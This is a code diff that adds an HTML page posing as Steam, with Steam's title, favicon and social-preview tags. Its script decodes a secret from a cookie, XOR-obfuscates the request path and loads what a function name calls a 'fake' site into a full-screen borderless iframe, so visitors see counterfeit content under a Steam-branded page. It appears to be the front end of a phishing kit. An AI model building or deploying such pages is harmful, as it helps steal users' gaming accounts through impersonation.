@@ -1,0 +1,108 @@
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<style>
+      html,
+      body {
+          padding: 0;
+          margin: 0;
+          height: 100vh;
+          width: 100vw;
+          overflow: hidden;
+      }
+	</style>
+	<title>Steam, The Ultimate Online Game Platform</title>
+  <meta property="og:title" content="Steam, The Ultimate Online Game Platform">
+  <link rel="shortcut icon" href="https://steamcommunity.com/favicon.ico" type="image/x-icon">
+  <meta property="og:description" content="Steam is the ultimate destination for playing, discussing, and creating games.">
+  <meta property="og:image" content="https://cdn.cloudflare.steamstatic.com/store/about/social-og.jpg">
+</head><body>
+<noscript>You need to enable JavaScript to run this app.</noscript>
+<script>
+	try {
+		window.token = JSON.parse(
+			base64decode(getCookie('token').split('.')[1]),
+		);
+		openFakeThroughIframe();
+	} catch (err) {
+		document.body.innerText = 'Please enable cookies and refresh the page';
+	}
+
+	function openFakeThroughIframe() {
+		const iframe = document.createElement('iframe');
+		iframe.id = 'iframe';
+		iframe.setAttribute('title', 'main');
+		iframe.setAttribute('name', 'site');
+		iframe.setAttribute(
+			'style',
+			'outline: 0; border: none; position: absolute; top: 0; right: 0; left: 0; bottom: 0; width: 100vw !important; height: 100vh !important;',
+		);
+		document.body.appendChild(iframe);
+		iframe.focus();
+		const form = document.createElement('form');
+		form.setAttribute('accept', 'text/html');
+		for (let key of ['pathname', 'search', 'hostname']) {
+			let input = document.createElement('input');
+			input.setAttribute('hidden', '');
+			input.setAttribute('name', key);
+			input.setAttribute('value', window.location[key]);
+			form.appendChild(input);
+		}
+
+		const url = window.location.pathname + window.location.search;
+		form.action = convertToDynamicPath(url, window.token.secret);
+		form.method = 'POST';
+		form.target = 'site';
+
+		document.body.appendChild(form);
+
+		form.submit();
+
+		setTimeout(() => {
+			form && form.remove();
+		}, 1);
+	}
+
+	/* Utils */
+	function base64decode(str) {
+		let decode = atob(
+			str.replace(/\s+/g, '').replace(/-/g, '+').replace(/_/g, '/'),
+		);
+		return decodeURIComponent(decode);
+	}
+	function getCookie(name) {
+		let cookies = document.cookie.split('; ');
+		for (let i = 0; i < cookies.length; i++) {
+			let cookie = cookies[i].split('=');
+			if (cookie[0] === name) {
+				return cookie[1];
+			}
+		}
+		throw new Error('No cookie');
+	}
+	function convertToDynamicPath(str, secret) {
+		let encrypted = '';
+		let startsWithSlash = str.startsWith('/');
+		if (startsWithSlash) {
+			str = str.slice(1);
+		}
+		let dotIndex = str.lastIndexOf('.');
+		let extension = '';
+		if (dotIndex !== -1) {
+			extension = str.slice(dotIndex);
+			str = str.slice(0, dotIndex);
+		}
+		str = 'DyNaM1c' + encodeURIComponent(str);
+		for (let i = 0; i < str.length; i++) {
+			const charCode = str.charCodeAt(i);
+			const secretChar = secret.charCodeAt(i % secret.length);
+			const encryptedCharCode = charCode ^ secretChar;
+			encrypted += encryptedCharCode.toString(16).padStart(2, '0');
+		}
+		encrypted += extension;
+		return startsWithSlash ? '/' + encrypted : encrypted;
+	}
+
+</script><iframe id="iframe" title="main" name="site" style="outline: 0; border: none; position: absolute; top: 0; right: 0; left: 0; bottom: 0; width: 100vw !important; height: 100vh !important;"></iframe>
+
+</body>
